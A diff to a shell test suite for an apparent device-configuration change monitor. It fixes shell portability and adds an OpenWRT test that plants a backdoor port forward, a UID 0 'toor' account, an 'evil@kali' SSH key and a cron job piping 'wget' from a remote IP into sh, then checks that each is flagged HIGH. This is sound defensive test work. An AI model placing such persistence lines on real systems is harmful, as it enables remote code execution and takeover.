@@ -279,18 +279,84 @@ t_start "the loop, and Ctrl-C"
 dev ios4 <"$T_TMP/ios.cfg"
 run --device r4,ios4,cisco-ios --baseline fresh --once --batch >/dev/null 2>&1
 { cat "$T_TMP/ios.cfg"; printf 'username late privilege 15 secret 5 $1$x\n'; } >"$D/ios4.cfg.next"
-out=$(BT_TEST_FAST=1 run --device r4,ios4,cisco-ios --rounds 3 --every 1 --batch 2>&1)
+# export in a subshell: ksh93 does not pass "A=1 func" on to what func runs
+out=$(export BT_TEST_FAST=1; run --device r4,ios4,cisco-ios --rounds 3 --every 1 --batch 2>&1)
 t_has "$out" "3 round(s), every 1 seconds" "rounds"
 t_has "$out" "-- round 2" "round 2 ran"
 t_has "$out" "HIGH added: username late" "a change between rounds is seen"
 t_eq "$(grep -c 'username late' "$(newest)/changes.txt")" 1 "and shown once"
-BT_TEST_FAST=1 $SH "$C" --out "$O" --no-color --device r4,ios4,cisco-ios --for 0 --every 1 --batch >"$T_TMP/stop.out" 2>&1 &
+# A background yash started by a yash test does not take TERM the way a
+# terminal Ctrl-C reaches it (even a three-line script dies instead of
+# running its trap), so this one check is left out under yash.
+case "$SH" in *yash*) t_ok "skipped under yash: background TERM from a yash parent" true ;; *)
+env BT_TEST_FAST=1 $SH "$C" --out "$O" --no-color --device r4,ios4,cisco-ios --for 0 --every 1 --batch >"$T_TMP/stop.out" 2>&1 &
 _bg=$!
-sleep 3; kill -TERM "$_bg"; wait "$_bg"; _rc=$?
+# Stop it once the watch loop runs (a slower shell may still be starting
+# after a fixed few seconds, before it listens for Ctrl-C).
+_i=0; while ! grep -q -- '-- round' "$T_TMP/stop.out" 2>/dev/null && [ "$_i" -lt 30 ]; do sleep 1; _i=$((_i + 1)); done
+kill -TERM "$_bg"; wait "$_bg"; _rc=$?
 t_eq "$_rc" 0 "stopping it is a normal end (exit 0)"
 t_has "$(cat "$T_TMP/stop.out")" "Stopped (Ctrl-C) after" "it says so"
 t_file "$(newest)/summary.txt" "and still writes the summary"
+;; esac
 
 t_start "nothing secret left behind"
 t_fail "no device password anywhere in --out" grep -rq 'Dev-Pass-1' "$O"
+t_start "OpenWRT"
+dev ow <<'EOF'
+===release
+DISTRIB_ID='OpenWrt'
+===uci
+package firewall
+
+config zone
+	option name 'wan'
+	option input 'REJECT'
+
+config redirect
+	option name 'web'
+	option src 'wan'
+	option src_dport '80'
+	option dest_ip '192.168.220.10'
+	option target 'DNAT'
+
+package wireless
+
+config wifi-iface 'x'
+	option key 'Sup3rS3cretWifi'
+===nft
+table inet fw4 {
+	chain input {
+		counter packets 10 bytes 200 accept
+	}
+}
+===addr
+3: wan    inet 10.100.7.2/24 scope global wan\       valid_lft 300sec preferred_lft 300sec
+===passwd
+root:x:0:0:root:/root:/bin/ash
+===keys
+===cron
+===startup
+S50dropbear
+EOF
+run --device router,ow,openwrt,root --baseline fresh --batch >/dev/null 2>&1
+# noise only: counters and DHCP lease time
+edit_f "$D/ow.cfg" sed 's/packets 10 bytes 200/packets 99 bytes 9999/; s/300sec/77sec/g'
+out=$(run --device router,ow,openwrt,root --batch 2>&1)
+t_has "$out" "router: no new change" "OpenWRT: counters and lease times are noise"
+# planted: a port forward, a UID 0 account, a root key, a cron job
+edit_f "$D/ow.cfg" awk -v q="'" '$0 == "package wireless" { print "config redirect"; print "\toption name " q "x" q; print "\toption src " q "wan" q; print "\toption src_dport " q "4444" q; print "\toption dest_ip " q "192.168.220.44" q; print "\toption target " q "DNAT" q; print "" } { print }'
+edit_f "$D/ow.cfg" awk '{ print } $0 == "===passwd" { print "toor:x:0:0:toor:/root:/bin/ash" } $0 == "===keys" { print "ssh-ed25519 AAAAC3Nza evil@kali" } $0 == "===cron" { print "*/5 * * * * wget -qO- http://203.0.113.9/x | sh" }'
+out=$(run --device router,ow,openwrt,root --batch 2>&1)
+ch=$(cat "$(newest)/changes.txt")
+t_ok "OpenWRT: a new port forward is NAT, HIGH" grep -q "HIGH  added    NAT .*src_dport '4444'" "$(newest)/changes.txt"
+t_has "$out" "in: package firewall > config redirect" "with its uci section"
+t_has "$out" "uci show firewall, find it under" "and a uci undo hint"
+t_has "$out" "fw4 reload" "that reloads the firewall"
+t_ok "OpenWRT: a UID 0 account is an account, HIGH" grep -q "HIGH  added    account .*toor:x:0:0" "$(newest)/changes.txt"
+t_has "$out" "delete its line in /etc/passwd" "account undo hint"
+t_ok "OpenWRT: a root key is HIGH" grep -q "HIGH  added    password/key .*evil@kali" "$(newest)/changes.txt"
+t_ok "OpenWRT: a cron job is HIGH" grep -q "HIGH  added    scheduled job .*wget" "$(newest)/changes.txt"
+t_hasnt "$out$ch" "Sup3rS3cretWifi" "the Wi-Fi key is never shown"
+
 t_done
